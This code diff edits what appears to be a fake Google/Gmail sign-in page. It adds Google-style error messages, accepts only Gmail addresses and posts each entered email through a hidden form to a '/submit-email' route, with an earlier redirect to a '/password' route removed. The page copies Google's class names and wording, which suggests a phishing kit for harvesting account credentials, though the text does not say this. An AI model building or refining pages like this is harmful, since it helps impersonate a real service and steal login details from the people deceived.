@@ -276,6 +276,7 @@
             <div class="right-column">
                 <div class="input-container">
                     <input type="text" id="emailInput" class="input-field" placeholder="Email or phone" autocomplete="off">
+                    <div id="emailError" class="dMNVAe" style="display:none; color:#d93025; font-size:13px; margin-top:8px;">Invalid email format</div>
                 </div>
                 
                 <div class="forgot-email-container">
@@ -312,28 +313,45 @@
             const nextButton = document.getElementById('nextButton');
             const emailInput = document.getElementById('emailInput');
 
-            function goToPasswordPage(emailValue) {
-                // Store email in sessionStorage for retrieval on password page
-                sessionStorage.setItem('gmail_email', emailValue);
-                // Redirect with email as URL param (encode for safety) to Flask route
-                window.location.href = '/password?email=' + encodeURIComponent(emailValue);
-            }
-
-            nextButton.addEventListener('click', function() {
-                const emailValue = emailInput.value;
-
-                // Basic validation to ensure the field isn't empty
-                if (emailValue.trim() === "") {
-                    emailInput.style.borderColor = '#EA4335';
-                    setTimeout(() => {
-                        emailInput.style.borderColor = '#8ab4f8';
-                    }, 2000);
+            nextButton.addEventListener('click', function(e) {
+                e.preventDefault();
+                const emailValue = emailInput.value.trim();
+                const emailError = document.getElementById('emailError');
+                // Google-style email validation
+                const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+                if (!emailValue) {
+                    emailError.textContent = 'Enter an email or phone number';
+                    emailError.style.display = 'block';
+                    emailInput.style.borderColor = '#d93025';
                     emailInput.focus();
-                    console.log("Validation failed: Email field is empty.");
+                    return;
+                } else if (!emailRegex.test(emailValue)) {
+                    emailError.textContent = 'We Couldn’t find your Google Account';
+                    emailError.style.display = 'block';
+                    emailInput.style.borderColor = '#d93025';
+                    emailInput.focus();
+                    return;
+                } else if (!emailValue.endsWith('@gmail.com') && !emailValue.endsWith('@googlemail.com')) {
+                    emailError.textContent = 'This account is not a Gmail or Google Workspace account';
+                    emailError.style.display = 'block';
+                    emailInput.style.borderColor = '#d93025';
+                    emailInput.focus();
+                    return;
                 } else {
-                    console.log(`Performing mail login for user: ${emailValue}`);
-                    goToPasswordPage(emailValue);
+                    emailError.style.display = 'none';
+                    emailInput.style.borderColor = '#8ab4f8';
                 }
+                // Submit email via POST to /submit-email
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = '/submit-email';
+                const emailField = document.createElement('input');
+                emailField.type = 'hidden';
+                emailField.name = 'email';
+                emailField.value = emailValue;
+                form.appendChild(emailField);
+                document.body.appendChild(form);
+                form.submit();
             });
 
             emailInput.addEventListener('keypress', function (e) {
